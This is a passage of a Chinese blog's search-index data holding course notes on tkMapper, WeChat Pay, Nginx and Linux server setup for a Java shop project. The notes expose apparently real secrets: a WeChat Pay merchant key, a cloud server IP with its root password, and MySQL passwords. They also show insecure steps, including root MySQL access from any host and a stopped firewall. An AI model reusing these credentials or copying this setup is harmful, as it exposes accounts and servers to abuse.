'昵称 昵称', `realname` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '真实姓名 真实姓名', `user_img` varchar(1024) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '头像 头像', `user_mobile` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '手机号 手机号', `user_email` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱地址 邮箱地址', `user_sex` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '性别 M(男) or F(女)', `user_birth` date NULL DEFAULT NULL COMMENT '生日 生日', `user_regtime` datetime(0) NOT NULL COMMENT '注册时间 创建时间', `user_modtime` datetime(0) NOT NULL COMMENT '更新时间 更新时间', PRIMARY KEY (`user_id`) USING BTREE ) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户 ' ROW_FORMAT = Compact; 4.2 创建实体类@Data @NoArgsConstructor @AllArgsConstructor public class User { private int userId; private String username; private String password; private String nickname; private String realname; private String userImg; private String userMobile; private String userEmail; private String userSex; private Date userBirth; private Date userRegtime; private Date userModtime; } 4.3 创建DAO接口 tkMapper已经完成了对单表的通用操作的封装，封装在Mapper接口和MySqlMapper接口；因此如果我们要完成对单表的操作，只需自定义DAO接口继承Mapper接口和MySqlMapper接口 public interface UserDAO extends Mapper&lt;User&gt;, MySqlMapper&lt;User&gt; { } 4.4 测试@RunWith(SpringRunner.class) @SpringBootTest(classes = TkmapperDemoApplication.class) public class UserDAOTest { @Autowired private UserDAO userDAO; @Test public void test(){ User user = new User(); user.setUsername(\"aaaa\"); user.setPassword(\"1111\"); user.setUserImg(\"img/default.png\"); user.setUserRegtime(new Date()); user.setUserModtime(new Date()); int i = userDAO.insert(user); System.out.println(i); } } 五、tkMapper提供的方法@RunWith(SpringRunner.class) @SpringBootTest(classes = TkmapperDemoApplication.class) public class CategoryDAOTest { @Autowired private CategoryDAO categoryDAO; @Test public void testInsert(){ Category category = new Category(0,\"测试类别3\",1,0,\"03.png\",\"xixi\",\"aaa.jpg\",\"black\"); //int i = categoryDAO.insert(category); int i = categoryDAO.insertUseGeneratedKeys(category); System.out.println(category.getCategoryId()); assertEquals(1,i); } @Test public void testUpdate(){ Category category = new Category(48,\"测试类别4\",1,0,\"04.png\",\"heihei\",\"aaa.jpg\",\"black\"); int i = categoryDAO.updateByPrimaryKey(category); // 根据自定义条件修改，Example example就是封装条件的 // int i1 = categoryDAO.updateByExample( Example example); assertEquals(1,i); } @Test public void testDelete(){ int i = categoryDAO.deleteByPrimaryKey(48); // 根据条件删除 //int i1 = categoryDAO.deleteByExample(Example example); assertEquals(1,i); } @Test public void testSelect1(){ //查询所有 List&lt;Category&gt; categories = categoryDAO.selectAll(); for (Category category: categories) { System.out.println(category); } } @Test public void testSelect2(){ //根据主键查询 Category category = categoryDAO.selectByPrimaryKey(47); System.out.println(category); } @Test public void testSelect3(){ //条件查询 //1.创建一个Example封装 类别Category查询条件 Example example = new Example(Category.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"categoryLevel\",1); criteria.orLike(\"categoryName\",\"%干%\"); List&lt;Category&gt; categories = categoryDAO.selectByExample(example); for (Category category: categories) { System.out.println(category); } } @Test public void testSelect4(){ //分页查询 int pageNum = 2; int pageSize = 10; int start = (pageNum-1)*pageSize; RowBounds rowBounds = new RowBounds(start,pageSize); List&lt;Category&gt; categories = categoryDAO.selectByRowBounds(new Category(), rowBounds); for (Category category: categories) { System.out.println(category); } //查询总记录数 int i = categoryDAO.selectCount(new Category()); System.out.println(i); } @Test public void testSelect5(){ //带条件分页 //条件 Example example = new Example(Category.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"categoryLevel\",1); //分页 int pageNum = 2; int pageSize = 3; int start = (pageNum-1)*pageSize; RowBounds rowBounds = new RowBounds(start,pageSize); List&lt;Category&gt; categories = categoryDAO.selectByExampleAndRowBounds(example,rowBounds); for (Category category: categories) { System.out.println(category); } //查询总记录数（满足条件） int i = categoryDAO.selectCountByExample(example); System.out.println(i); } } 六、在使用tkMapper是如何进行关联查询6.1 所有的关联查询都可以通过多个单表操作实现//查询用户同时查询订单 Example example = new Example(User.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"username\",\"zhangsan\"); //根据用户名查询用户 //1.先根据用户名查询用户信息 List&lt;User&gt; users = userDAO.selectByExample(example); User user = users.get(0); //2.再根据用户id到订单表查询订单 Example example1 = new Example(Orders.class); Example.Criteria criteria1 = example1.createCriteria(); criteria1.andEqualTo(\"userId\",user.getUserId()); List&lt;Orders&gt; ordersList = orderDAO.selectByExample(example1); //3.将查询到订单集合设置到user user.setOrdersList(ordersList); System.out.println(user); 6.2 自定义连接查询 在使用tkMapper,DAO继承Mapper和MySqlMapper之后，还可以自定义查询 6.2.1 在DAO接口自定义方法public interface UserDAO extends GeneralDAO&lt;User&gt; { public User selectByUsername(String username); } 6.2.2 创建Mapper文件&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt; &lt;mapper namespace=\"com.qfedu.fmmall.dao.UserDAO\"&gt; &lt;insert id=\"insertUser\"&gt; insert into users(username,password,user_img,user_regtime,user_modtime) values(#{username},#{password},#{userImg},#{userRegtime},#{userModtime}) &lt;/insert&gt; &lt;resultMap id=\"userMap\" type=\"User\"&gt; &lt;id column=\"user_id\" property=\"userId\"/&gt; &lt;result column=\"username\" property=\"username\"/&gt; &lt;result column=\"password\" property=\"password\"/&gt; &lt;result column=\"nickname\" property=\"nickname\"/&gt; &lt;result column=\"realname\" property=\"realname\"/&gt; &lt;result column=\"user_img\" property=\"userImg\"/&gt; &lt;result column=\"user_mobile\" property=\"userMobile\"/&gt; &lt;result column=\"user_email\" property=\"userEmail\"/&gt; &lt;result column=\"user_sex\" property=\"userSex\"/&gt; &lt;result column=\"user_birth\" property=\"userBirth\"/&gt; &lt;result column=\"user_regtime\" property=\"userRegtime\"/&gt; &lt;result column=\"user_modtime\" property=\"userModtime\"/&gt; &lt;/resultMap&gt; &lt;select id=\"queryUserByName\" resultMap=\"userMap\"&gt; select user_id, username, password, nickname, realname, user_img, user_mobile, user_email, user_sex, user_birth, user_regtime, user_modtime from users where username=#{name} &lt;/select&gt; &lt;/mapper&gt; 七、逆向工程 逆向工程，根据创建好的数据表，生成实体类、DAO、映射文件 7.1 添加逆向工程依赖 是依赖是一个mybatis的maven插件 &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.5&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper&lt;/artifactId&gt; &lt;version&gt;3.4.4&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/plugin&gt; 7.2 逆向工程配置 在resources/generator目录下创建generatorConfig.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE generatorConfiguration PUBLIC \"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\" \"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\"&gt; &lt;generatorConfiguration&gt; &lt;!-- 引入数据库连接配置 --&gt; &lt;!-- &lt;properties resource=\"jdbc.properties\"/&gt;--&gt; &lt;context id=\"Mysql\" targetRuntime=\"MyBatis3Simple\" defaultModelType=\"flat\"&gt; &lt;property name=\"beginningDelimiter\" value=\"`\"/&gt; &lt;property name=\"endingDelimiter\" value=\"`\"/&gt; &lt;!-- 配置 GeneralDAO --&gt; &lt;plugin type=\"tk.mybatis.mapper.generator.MapperPlugin\"&gt; &lt;property name=\"mappers\" value=\"com.qfedu.tkmapperdemo.general.GeneralDAO\"/&gt; &lt;/plugin&gt; &lt;!-- 配置数据库连接 --&gt; &lt;jdbcConnection driverClass=\"com.mysql.jdbc.Driver\" connectionURL=\"jdbc:mysql://localhost:3306/fmmall2\" userId=\"root\" password=\"admin123\"&gt; &lt;/jdbcConnection&gt; &lt;!-- 配置实体类存放路径 --&gt; &lt;javaModelGenerator targetPackage=\"com.qfedu.tkmapperdemo.beans\" targetProject=\"src/main/java\"/&gt; &lt;!-- 配置 XML 存放路径 --&gt; &lt;sqlMapGenerator targetPackage=\"/\" targetProject=\"src/main/resources/mappers\"/&gt; &lt;!-- 配置 DAO 存放路径 --&gt; &lt;javaClientGenerator targetPackage=\"com.qfedu.tkmapperdemo.dao\" targetProject=\"src/main/java\" type=\"XMLMAPPER\"/&gt; &lt;!-- 配置需要指定生成的数据库和表，% 代表所有表 --&gt; &lt;table tableName=\"%\"&gt; &lt;!-- mysql 配置 --&gt; &lt;!-- &lt;generatedKey column=\"id\" sqlStatement=\"Mysql\" identity=\"true\"/&gt;--&gt; &lt;/table&gt; &lt;!-- &lt;table tableName=\"tb_roles\"&gt;--&gt; &lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;generatedKey column=\"roleid\" sqlStatement=\"Mysql\" identity=\"true\"/&gt;--&gt; &lt;!-- &lt;/table&gt;--&gt; &lt;!-- &lt;table tableName=\"tb_permissions\"&gt;--&gt; &lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;generatedKey column=\"perid\" sqlStatement=\"Mysql\" identity=\"true\"/&gt;--&gt; &lt;!-- &lt;/table&gt;--&gt; &lt;/context&gt; &lt;/generatorConfiguration&gt; 7.3 将配置文件设置到逆向工程的maven插件 7.4 执行逆向生成","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"微信支付","slug":"04-锋迷商城-随堂笔记/05-微信支付/微信支付","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:19:16.713Z","comments":true,"path":"posts/13.html","link":"","permalink":"https://bigbug888.github.io/posts/13.html","excerpt":"","text":"微信支付 通过微信平台为商家提供代收款服务 1.微信支付业务—商户注册微信支付业务https://pay.weixin.qq.com/index.php/core/home/login?return_url=%2F 商户编号：1497984412 商户账号AppID：wx632c8f211f8122c6 商户Key：sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC 2.申请支付订单—商户向支付平台申请支付链接 支付订单，并不是用户提交的商品订单，而是商户向微信支付平台申请的支付链接 2.1 导入微信支付的依赖 wxpay的maven依赖 &lt;dependency&gt; &lt;groupId&gt;com.github.wxpay&lt;/groupId&gt; &lt;artifactId&gt;wxpay-sdk&lt;/artifactId&gt; &lt;version&gt;0.0.3&lt;/version&gt; &lt;/dependency&gt; 2.2 创建微信支付配置类，配置商户信息 创建一类，实现WxPayConfig接口 重写三分方法，分别设置商户AppID\\商户ID\\商户密钥 public class MyPayConfig implements WXPayConfig { @Override public String getAppID() { return \"wx632c8f211f8122c6\"; } @Override public String getMchID() { return \"1497984412\"; } @Override public String getKey() { return \"sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC\"; } @Override public InputStream getCertStream() { return null; } @Override public int getHttpConnectTimeoutMs() { return 0; } @Override public int getHttpReadTimeoutMs() { return 0; } } 2.3 设置支付订单的参数HashMap&lt;String,String&gt; data = new HashMap&lt;&gt;(); data.put(\"body\",\"咪咪萧条\"); //商品描述 data.put(\"out_trade_no\",orderId); //使用当前用户订单的编号作为当前支付交易的交易号 data.put(\"fee_type\",\"CNY\"); //支付币种 data.put(\"total_fee\",\"1\"); //支付金额 data.put(\"trade_type\",\"NATIVE\"); //交易类型 data.put(\"notify_url\",\"/pay/success\"); //设置支付完成时的回调方法接口 2.4 申请支付链接WXPay wxPay = new WXPay(new MyPayConfig()); Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); //发送请求 orderInfo.put(\"payUrl\",resp.get(\"code_url\"));","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"Nginx","slug":"04-锋迷商城-随堂笔记/07-Nginx/Nginx","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:20:27.367Z","comments":true,"path":"posts/15.html","link":"","permalink":"https://bigbug888.github.io/posts/15.html","excerpt":"","text":"一、Nginx介绍1.1 为什么要使用Nginx1.1 静态资源访问 前端项目在进行服务器部署的时候，如果基于tomcat则不能满足并发的需求，因此我们需要一种能够处理更高并发的适用于静态资源的服务器 1.2 代理服务器-负载均衡1.2 Nginx介绍 Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器 Nginx 是基于HTTP协议的请求/响应（部署web项目） —- 静态资源服务器 Nginx可以作为反向代理服务器 —- 负载均衡服务器(代理服务器) Nginx特点： 稳定性极强，可以实现7*24不间断运行 提供简洁、直观的配置 占用内存很小、并发能力很强（5w+） 二、Nginx下载、安装及配置2.1 windows环境2.1 .1下载http://nginx.org/en/download.html 2.1.2 解压到指定目录解压即可 2.1.3 运行及访问 执行根路径下的nginx.exe nginx 默认端口 80,所以直接访问 ： http://localhost 2.2 Linux环境三、Nginx配置 配置文件说明 #user nobody; # 配置处理器个数（应不大于cpu核心数） worker_processes 1; # 配置nginx运行日志文件 error_log logs/error.log; # 配置Nginx进程的进程号的存储文件 # pid logs/nginx.pid; # 配置nginx连接数，数值越大并发能力越强 events { worker_connections 2000; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { # 配置nginx端口号 listen 80; server_name localhost; # 地址映射 #location / { # root html; # index index.html index.htm; #} location / { root fmall-static; index index.html index.htm; } # 指定错误页面 error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } 四、锋迷商城—前端部署 安装Nginx 将前端项目fmall-static拷贝到nginx的根目录 修改nginx.conf： location / { root fmall-static; index index.html index.htm; }","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"Linux","slug":"04-锋迷商城-随堂笔记/06-Linux/Linux","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:19:43.020Z","comments":true,"path":"posts/14.html","link":"","permalink":"https://bigbug888.github.io/posts/14.html","excerpt":"","text":"一、Linux介绍 学习背景：Java项目生产环境绝大多数都是基于Linux进行搭建的 1.1 Linux系统介绍 Linux和windows一样是一个操作系统（就如同android和ios手机系统一样） Linux是一套免费使用、可以自由传播的类unix操作系统 Linux可以支持多用户、多任务、支持多线程及多CPU的操作系统 Linux通常作为专用服务器系统（应用服务器、数据库服务器）使用——Java 1.2 Linux系统特点 系统稳定性比windows要好（宕机概率比较低） 完全开源、用户可以进行自由的系统裁剪、灵活性高、使用成本低 Linux核心防火墙组件性能高、配置简单、安全性高 Linux提供了纯命令行系统（也可以带有界面）、进一步减小系统本身的开销 Linux使用非常广泛、技术社区比较发达、学习资源也很丰富 综上，Linux比windows更适合用于服务器系统 1.3 Linux系统版本 RedHat （RedHat公司发行的Linux版本：效率高、扩展性好、高可靠性） SUSE （德国的SUSE公司发行的版本） 红旗Linux CentOS （基于RedHat源码编译而成、完全开源） DEbian（有很对社区进行维护的非官方版本，商业可用性不高） Ubuntu（乌班图，基于DEbian的发行，提供了优化后的桌面系统） 二、虚拟机 如何获取一个Linux操作系统？ 基于硬件安装Linux（双系统） 安装虚拟机，基于虚拟机安装linux系统 租用云主机（linux） 2.1 虚拟机介绍 使用软件模拟硬件环境——从当前的计算机资源中分离出一部分可独立运行的资源 2.2 下载安装vmware 详细步骤参考VMware workstation下载、安装、激活.pdf文档 2.2.1 下载Download VMware Workstation Pro 2.2.2 安装傻瓜式安装 安装完成之后重启计算机 2.2.3 激活计算机重启之后，第一次运行vmware时输入序列号进行激活 2.3 创建虚拟机 桥接网络和转换网络 桥接网络 转换网络 2.4 安装CentOS参考虚拟机创建及linux安装.pdf 打开终端：application – Terminal(终端) 查看网络配置： ifconfig 切换用户： su username ## 输入密码 （低级权限用户切换到高级权限用户是需要输入密码的） 重启Linux reboot 系统状态切换 ## 切换到命令行模式 init 3 ## 切换到桌面模式 init 5 三、Linux远程工具3.1 Linux资源管理工具 xftp SSH 3.1.1 xftp下载https://www.netsarang.com/zh/xftp-download/ 3.1.2 安装傻瓜式安装 3.1.3 创建xftp与linux的连接 3.2 Linux远程终端3.2.1 xshell下载3.2.2 xshell安装傻瓜式安装 3.2.3 创建xshell与Linux的连接 四、云主机 使用虚拟机的限制： 1.虚拟机共享宿主机的资源 2.虚拟机的故障率比较高 3.虚拟机也是基于内网的网络 4.1 什么是云主机？ 云主机就是使用一种虚拟化技术在一台主机中虚拟出多个“独立”的主机部分，能够实现单机多用户，每个部分都可以作为单独的主机来管理和使用。 4.2 购买云主机 推荐阿里和腾讯 腾讯：云+校园 https://cloud.tencent.com/act/campus 阿里：24岁 https://developer.aliyun.com/plan/grow-up 4.3 云主机管理 阿里云/腾讯云都提供了一个管理系统，用户对云主机进行配置和管理 阿里云控制中心： https://console.aliyun.com 4.3.1 轻量级服务器管理 常规管理 防火墙设置 4.3.2 ECS服务器管理 常规管理 安全组管理（防火墙） 4.4 远程工具连接云主机 云主机公网IP：47.110.38.44 root帐号的密码：Lxl19950902 4.4.1 xftp远程连接云主机4.4.2 xshell远程连接云主机五、Linux常用操作指令5.1 如何学习Linux？ Linux的文件系统 Linux文件管理 目录：进退、创建、删除 文件：创建与编辑、复制和粘贴、移动和删除、压缩和解压 用户及权限的管理 在windows中，通常都是自己使用自己的机器，很少出现多个人使用同一台机器的情况，所以在我们日常使用windows都只有一个账号，也就不会关注不同账号之间的权限问题 但是在linux系统使用过程中，通常是作为服务器系统使用，所以通常都会在一个Linux系统中创建多个不同权限的用户（root就是一个超级管理员身份的用户） 软件管理 软件安装 软件配置 软件卸载 5.2 Linux文件系统 Linux系统不同于windows，在Linux系统中没有盘符，根路径用”/“表示 [root@theo ~]# cd / [root@theo /]# ls bin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var [root@theo /]# 目录 说明 bin 系统文件夹，存放linux的系统文件 sbin 超级管理员的系统命令 boot 系统所需目录（系统启动相关文件） etc 存放系统配置相关的文件（环境变量） lib/lib64 library 存放系统所需的依赖库 home 一般用户所在文件夹（此目录包含了所有普通用户的用户目录） root 超级管理员目录（root用户目录） media 媒体(光驱) mnt 挂载（U盘、移动硬盘） tmp、opt 临时的文件存储目录，比如日志存储在tmp或者opt中 usr 用户目录，我们通常安装的软件、用户的一些文件都在此目录下 run srv sys var proc dev 系统相关目录 5.3 Linux系统指令语法示例： tar -zcvf b.tar otp_src_20.1 指令 [选项] 参数 指令，决定了当前的动作 选项，可有可无（对于有些指令，选项是必须的） “-” 表示短选项，一个字母代表一个选项 “–”表示长选项，一个单词代表一个选项 参数，指令正常执行所需的数据 man指令（manual:说明书） man 指令 点击q退出说明书 5.4 文件管理5.4.1 目录操作指令 进入文件夹及退出文件夹 cd 目录名称 进入指定的目录（当我们输入目录名称的时候，可以通过Tab进行自动补全） ## 进入到Linux系统跟路径 cd / ## 进入到当前用户的目录（如果是root用户则进入到/root,如果是其他用户则进入到/home/中的用户目录） cd ~ cd .. 退出当前目录 pwd （print working directory）查看当前路径 绝对路径和相对路径 ##绝对路径： cd 指令参数的路径如果是以/开头，表示从系统的根路径下去查找 cd /path ##相对路径：cd 指令参数的路径如果没有/，则表示从当前目录去查找 cd path 显示当前目录下的文件列表 ls 显示文件列表 ls -a 显示当前目录下所有文件列表（包括隐藏文件） ls -l 显示当前目录下文件列表的详细信息 ll 显示文件列表详细信息（相当于 ls -l） 目录的创建和删除 mkdir 目录名 在当前目录下创建新的目录（创建一级目录） mkdir -p 目录A/目录B 连同父级目录一起创建 创建目录 rm -r 目录 删除当前目录（需要确认） rmdir 目录 专门用于删除目录 rm -rf 目录 删除当前目录（强制删除，无需确认） -r recursive 递归（删除目录及目录中的内容） -f force 强制 5.4.2 文件操作指令 创建和修改文件 vi （visual） 文件编辑 vim （visual improved） 增强文件编辑 # 打开目标文件；如果此文件不存在，则表示先创建此文件再打开 vi a.txt 当文件打开之后，点击”i”/“a”进入到编辑状态； 完成编辑之后，点击“esc”退出编辑状态； 退出文件： :q 如果未对文件进行任何修改—退出文件 :q! 对文件内容进行了修改，但是不保存退出 :wq 保存对文件的修改并退出 vim +行号 文件名 进入到当前文件编辑器，光标指向指定的行号 阅读文件 cat 文件名 阅读文件内容，适合阅读小文件 more 文件名 阅读文件，带有翻页（回车一次往下一行，不支持向上翻页） less 文件名 阅读文件，适合阅读打文件；可以上下翻页（PgDn/PgUp），退出less阅读模式点击q 在less阅读模式下，输入“?查询内容”可以向上查询数据；输入“/查询内容”可以实现向下查询内容 查询文件和查询内容 find 文件名 在当前目录查找文件/目录 find 文件名 目录 在指定的目录中查找文件 find -name 文件名 在当前目录包括当前目录子目录中查找文件 grep -n 内容 文件 在指定的文件中查找指定的内容 管道命令 管道命令：多个命令的组合 特征：前面的命令必须有输出，后面的命令使用这个输出 实例：cat a.txt | grep Hello| grep 23 删除文件 rm -rf 文件名 复制和移动 cp 文件 目录 mv 文件 目录 5.4.3 文件压缩和解压 windows系统下压缩文件通常是zip、rar等格式；Linux系统压缩文件通常为tar.gz(tar包) tar 指令 完成linux系统的文件压缩和解压 tar -zcvf 压缩 # 对test1目录进行压缩，压缩到test1.tar文件 tar -zcvf test1.tar test1 # 将test1和test2进行压缩，压缩到test.tar文件 tar -zcvf test.tar test1 test2 tar -zxvf 解压 # 解压指定的压缩文件 tar -zxvf test.tar 指令说明： z 用gzip工具进行压缩或者解压 x extract 解压缩 c compress 压缩 v verbose显示压缩/解压过程详细信息 f file 文件 5.5 用户及权限管理 Linux系统支持多用户，采用用户组的形式管理多个用户（root用户就在root用户组） 在Linux中提供了严格的权限管理（用户对文件/目录的操作权限，root用户默认具有所有文件的操作权限） 对文件的操作权限：读、写、执行 用户组 groupadd team1 创建用户组 groupdel team1 删除用户组 用户 useradd -g 用户组 用户名 创建新用户 passwd 用户名 设置用户密码 userdel 用户名 删除用户 切换用户 su 用户名 切换至其他普通用户 su 切换至管理员（需要输入超级管理员密码） 权限管理 说明： 第一个字符表示文件|目录 ，d表示目录，-表示文件 r 可读(4) w可写(2) x 可执行(1) 第一个rwx：表示当前文件的所有者拥有的权限 第二个rwx：表示和文件所有者同组用户拥有的权限 第三个rwx：表示不同组用户拥有的权限 修改权限 chmod chmod 775 文件名 5.6 系统与进程 查询进程top ps -ef | grep java 通过进程名称查找进程 根据端口查找进程 lsof -i:port 通过端口查询进程信息 如果此指令不可以用，则需要通过 yum install -y lsof安装指令 CentOS6 Ubuntu没有此指令 netstat -apn | grep port 通过端口查询进程信息 （CentOS6） 强杀进程 kill -9 PID 通过进程编号强杀进程 系统注销和重启 logout 注销 reboot 重启 六、软件管理相关的指令（wget， rpm，yum）6.1 wget指令 我们在linux中安装软件，首先要完成软件安装包的下载；获取Linux系统中软件的安装包，我们有两种途径： 在windows中进行下载（百度搜索—下载），通过xftp将windows现在的安装包上传到Linux系统 直接在linux系统中，通过wget进行下载 6.1.1 wget介绍 wget是Linux系统中一个下载文件的工具，Linux系统自带 6.1.2 wget使用 wget [option] url mysql 下载： wget http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm 6.2 rpm指令6.2.1 rpm介绍RPM(Red-Hat Package Manager) 是一款Linux系统的软件包的管理器，可以完成Linux系统中应用的安装、卸载 6.2.2 rpm指令 查询：rpm -qa | grep 关键字 卸载：rpm -e --nodeps 软件名称 安装：rpm -ivh 安装包.rpm mysql安装: rpm -ivh mysql57-community-release-el7-10.noarch.rpm 更新：rpm -Uvh 安装包.rpm 6.3 yum指令6.3.1 yum介绍 yum(全称：Yellow Dog Updater，Modified)，基于RPM包管理，能够从指定的服务器自动下载rpm并安装，可以自定处理依赖关系，一次安装所有的依赖软件，无需一个个的下载安装。 6.3.2 yum指令 yum [-y] install http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm yum list yum list 列出系统中所有的包 yum [-y] install rpm包 下载并安装rpm包 yum update rpm包 yum remove rpm包 七、JDK安装（离线安装）7.1 下载JDK（Linux版）官网/云盘 （jdk.tar.gz） 7.2 使用xftp将下载的安装包上传到linux的/usr/local目录 7.3 解压JDK安装包 7.4 查看JDK工具 JDK目录结构 7.5 配置环境变量 进入到/etc目录，找到profile文件 编辑profile文件 ： vim profile 在profile文件最后配置以下内容 export JAVA_HOME=/usr/local/jdk1.8.0_221 export JRE_HOME=$JAVA_HOME/jre export CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/lib export PATH=$JAVA_HOME/bin:$PATH 7.6 让配置生效# 让配置生效 [root@theo etc]# source /etc/profile # 显示jdk版本 [root@theo etc]# java -version java version \"1.8.0_221\" Java(TM) SE Runtime Environment (build 1.8.0_221-b11) Java HotSpot(TM) 64-Bit Server VM (build 25.221-b11, mixed mode) 八、Tomcat安装8.1 下载离线tar略 8.2 上传到Linux略 8.3 解压tar文件tar -zxvf apache-tomcat-8.5.46.tar.gz 8.4 启动tomcat[root@theo apache-tomcat-8.5.46]# cd /usr/local/apache-tomcat-8.5.46/bin [root@theo bin]# ls bootstrap.jar catalina-tasks.xml commons-daemon.jar configtest.sh digest.sh shutdown.bat startup.sh tool-wrapper.bat version.sh catalina.bat ciphers.bat commons-daemon-native.tar.gz daemon.sh setclasspath.bat shutdown.sh tomcat-juli.jar tool-wrapper.sh catalina.sh ciphers.sh configtest.bat digest.bat setclasspath.sh startup.bat tomcat-native.tar.gz version.bat [root@theo bin]# ./startup.sh Using CATALINA_BASE: /usr/local/apache-tomcat-8.5.46 Using CATALINA_HOME: /usr/local/apache-tomcat-8.5.46 Using CATALINA_TMPDIR: /usr/local/apache-tomcat-8.5.46/temp Using JRE_HOME: /usr/local/jdk1.8.0_221/jre Using CLASSPATH: /usr/local/apache-tomcat-8.5.46/bin/bootstrap.jar:/usr/local/apache-tomcat-8.5.46/bin/tomcat-juli.jar Tomcat started. 8.5 关闭防火墙# 查看防火墙状态 [root@theo bin]# systemctl status firewalld ● firewalld.service - firewalld - dynamic firewall daemon Loaded: loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled) Active: inactive (dead) Docs: man:firewalld(1) # 关闭防火墙 [root@theo bin]# systemctl stop firewalld # 启动防火墙 [root@theo bin]# systemctl start firewalld 8.6 访问云主机上的tomcat 安全组设置：要让tomcat的端口允许访问 http://47.96.11.185:8080/ 8.7 停止tomcat[root@theo bin]# lsof -i:8080 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME java 30394 root 53u IPv4 64248 0t0 TCP *:webcache (LISTEN) [root@theo bin]# kill -9 30394 九、安装MySQL9.1 在线安装（推荐）9.1.1 通过wget指令下载mysql的rpm文件[root@theo local]# pwd /usr/local [root@theo local]# ls aegis apache-tomcat-8.5.46 bin etc games include jdk1.8.0_221 lib lib64 libexec sbin share src [root@theo local]# wget http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm 9.1.2 rpm安装mysql[root@theo local]# rpm -ivh mysql57-community-release-el7-10.noarch.rpm 9.1.3 通过yum安装mysql服务[root@theo local]# yum -y install mysql-community-server 9.1.4 加入开机启动[root@theo local]# systemctl enable mysqld 9.1.5 启动MySQL服务[root@theo local]# systemctl start mysqld [root@theo local]# lsof -i:3306 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME mysqld 8430 mysql 17u IPv6 70095 0t0 TCP *:mysql (LISTEN) 或者使用： service mysqld start 5.1.5 停止MySQL服务[root@theo local]# systemctl stop mysqld 或者使用：service mysqld stop 9.2 离线下载安装9.2.1 在windows下载mysql安装文件（2个）MySQL-server-5.6.45-1.el7.x86_64.rpm MySQL-client-5.6.45-1.el7.x86_64.rpm 9.2.2 将安装包上传到linux(/usr/local) xftp 9.2.3 清除centos自带的mariaDB包[root@theo local]# rpm -qa | grep mariadb [root@theo local]# rpm -e --nodeps mariadb-libs-... 9.2.4 安装mysql的服务和客户端[root@theo local]#rpm -ivh MySQL-server-5.6.45-1.el7.x86_64.rpm [root@theo local]#rpm -ivh MySQL-client-5.6.45-1.el7.x86_64.rpm 9.3 MySQL基本使用# 1.查找初始密码 cat /var/log/mysqld.log | grep password # 2.登录到mysql [root@theo log]# mysql -uroot -p Enter password: # 3.修改密码 # 3-1 设置密码的检查机制为LOW set global validate_password_policy=LOW # 3-2 修改密码 set password=password('admin123'); # 4.授权远程登录 GRANT ALL PRIVILEGES on *.* to 'root'@'%' IDENTIFIED by 'admin123' WITH GRANT OPTION; flush PRIVILEGES; 十、安装Nginx（在线安装）10.1 安装编译工具（nginx安装之前需要编译）[root@theo local]# yum install -y gcc gcc-c++ 10.2 安装PCRE# 1.下载 [root@theo local]# wget http://downloads.sourceforge.net/project/pcre/pcre/8.35/pcre-8.35.tar.gz # 2.解压 [root@theo local]# tar -zxvf 